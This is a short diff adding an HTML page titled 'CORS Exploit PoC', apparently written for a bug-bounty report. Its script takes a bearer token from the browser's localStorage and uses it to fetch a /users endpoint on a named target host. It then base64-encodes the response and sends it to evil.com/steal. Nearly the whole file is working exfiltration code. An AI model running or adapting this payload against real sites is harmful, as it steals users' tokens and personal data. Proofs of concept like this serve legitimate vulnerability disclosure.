@@ -1,0 +1,15 @@
+<html>
+<body>
+<h1>CORS Exploit PoC</h1>
+<script>
+fetch("https://bug-bounty-api.k8s.tools-001.d-use-1.braze-dev.com/users", {
+    method: "GET",
+    headers: {
+        "Authorization": "Bearer " + localStorage.getItem("token")
+    }
+})
+.then(r => r.text())
+.then(d => fetch("https://evil.com/steal?data=" + btoa(d)));
+</script>
+</body>
+</html>
